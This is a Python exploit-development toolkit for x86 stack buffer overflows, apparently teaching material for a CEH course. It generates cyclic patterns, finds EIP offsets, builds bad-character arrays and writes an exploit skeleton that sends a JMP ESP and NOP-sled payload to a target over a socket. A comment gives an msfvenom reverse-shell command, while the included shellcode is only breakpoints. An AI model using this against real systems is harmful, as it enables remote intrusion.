#!/usr/bin/env python3
"""
Buffer Overflow Automation Toolkit (x86 32-bit Stack Exploitation)
Part of Cybersecurity Arsenal Scripts
Matches curriculum: CEH-Notes/Module-6-Buffer-Overflow
Features:
- Cyclic pattern generator (equivalent to Metasploit pattern_create)
- Pattern offset finder (equivalent to Metasploit pattern_offset)
- Bad character array generator
- Exploit payload skeleton builder (JMP ESP + NOP Sled + Shellcode)
"""

import sys
import struct
import argparse

def generate_cyclic_pattern(length: int) -> str:
    """Generate cyclic pattern of specified length (Upper, Lower, Digit)."""
    pattern = []
    upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    lower = "abcdefghijklmnopqrstuvwxyz"
    digits = "0123456789"
    
    for u in upper:
        for l in lower:
            for d in digits:
                if len(pattern) >= length:
                    return "".join(pattern[:length])
                pattern.append(u)
                if len(pattern) >= length:
                    return "".join(pattern[:length])
                pattern.append(l)
                if len(pattern) >= length:
                    return "".join(pattern[:length])
                pattern.append(d)
                
    return "".join(pattern[:length])

def find_pattern_offset(target: str, max_length: int = 50000) -> int:
    """Find offset of target (4-byte string or 0x... hex) in cyclic pattern."""
    pattern = generate_cyclic_pattern(max_length)
    
    search_str = ""
    # If passed as hex, e.g. 0x39694438 or 39694438
    clean = target.lower().replace("0x", "")
    if len(clean) == 8:
        try:
            # Little-endian unpack
            bytes_val = bytes.fromhex(clean)
            search_str = bytes_val[::-1].decode("latin-1")
        except Exception:
            search_str = target
    else:
        search_str = target

    idx = pattern.find(search_str)
    if idx != -1:
        return idx
    # Try direct search
    return pattern.find(target)

def generate_badchars(exclude_hex: str = "00") -> str:
    """Generate bad character hex string excluding specified bytes."""
    excluded = set()
    for b in exclude_hex.replace(",", " ").split():
        clean_b = b.replace("\\x", "").replace("0x", "").strip()
        if clean_b:
            try:
                excluded.add(int(clean_b, 16))
            except ValueError:
                pass

    badchars = bytearray()
    for i in range(1, 256):
        if i not in excluded:
            badchars.append(i)

    hex_output = "".join(f"\\x{b:02x}" for b in badchars)
    return hex_output

def generate_exploit_skeleton(ip: str, port: int, offset: int, jmp_esp: str) -> str:
    """Generate Python 3 exploit script skeleton."""
    return f"""#!/usr/bin/env python3
# Generated Stack Buffer Overflow Exploit Skeleton
import socket
import sys

target_ip = "{ip}"
target_port = {port}

# 1. Padding to overwrite EIP
offset = {offset}
junk = b"A" * offset

# 2. Overwrite EIP with JMP ESP (Little-endian format, e.g. \\xaf\\x11\\x50\\x62)
eip = {jmp_esp}

# 3. NOP Sled
nops = b"\\x90" * 16

# 4. Shellcode payload (Generate with msfvenom)
# msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=... -b "\\x00" -f py
shellcode = (
    b"\\xcc" * 32  # INT3 Software Breakpoint for testing in debugger
)

payload = junk + eip + nops + shellcode

print(f"[*] Sending exploit payload ({{len(payload)}} bytes) to {{target_ip}}:{{target_port}}...")
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(payload + b"\\r\\n")
    s.close()
    print("[+] Payload delivered successfully!")
except Exception as e:
    print(f"[-] Connection failed: {{e}}")
"""

def main():
    parser = argparse.ArgumentParser(description="Buffer Overflow Automation Toolkit (x86 Stack Exploitation)")
    subparsers = parser.add_subparsers(dest="command")

    # pattern-create
    pc = subparsers.add_parser("pattern-create", help="Generate cyclic pattern")
    pc.add_argument("length", type=int, help="Pattern length in bytes (e.g. 3000)")

    # pattern-offset
    po = subparsers.add_parser("pattern-offset", help="Find offset in cyclic pattern")
    po.add_argument("value", help="EIP value in hex (e.g. 0x39694438 or 8Di9)")

    # badchars
    bc = subparsers.add_parser("badchars", help="Generate bad character test array")
    bc.add_argument("--exclude", default="00", help="Comma-separated hex bytes to exclude (default: 00)")

    # skeleton
    sk = subparsers.add_parser("skeleton", help="Generate Python exploit template")
    sk.add_argument("--ip", default="192.168.1.100", help="Target IP")
    sk.add_argument("--port", type=int, default=9999, help="Target Port")
    sk.add_argument("--offset", type=int, default=2003, help="Offset to EIP")
    sk.add_argument("--jmp-esp", default='b"\\xaf\\x11\\x50\\x62"', help="JMP ESP address in bytes")

    args = parser.parse_args()

    if args.command == "pattern-create":
        pat = generate_cyclic_pattern(args.length)
        print(pat)
    elif args.command == "pattern-offset":
        off = find_pattern_offset(args.value)
        if off != -1:
            print(f"[+] Exact match offset found at: {off}")
        else:
            print("[-] Value not found in pattern.")
    elif args.command == "badchars":
        print(f"[*] Badchar byte array (excluding: {args.exclude}):\n")
        print(generate_badchars(args.exclude))
    elif args.command == "skeleton":
        print(generate_exploit_skeleton(args.ip, args.port, args.offset, args.jmp_esp))
    else:
        # Default self-test
        print("[*] Running Buffer Overflow Automation self-test...")
        sample_pat = generate_cyclic_pattern(200)
        print(f"[+] Sample pattern (first 50 bytes): {sample_pat[:50]}...")
        test_chunk = sample_pat[120:124]
        found_off = find_pattern_offset(test_chunk)
        print(f"[+] Target '{test_chunk}' identified at offset: {found_off} (Expected: 120)")
        assert found_off == 120, "Offset finder verification failed!"
        print("[SUCCESS] Buffer Overflow Automation Toolkit self-test passed!")

if __name__ == "__main__":
    main()
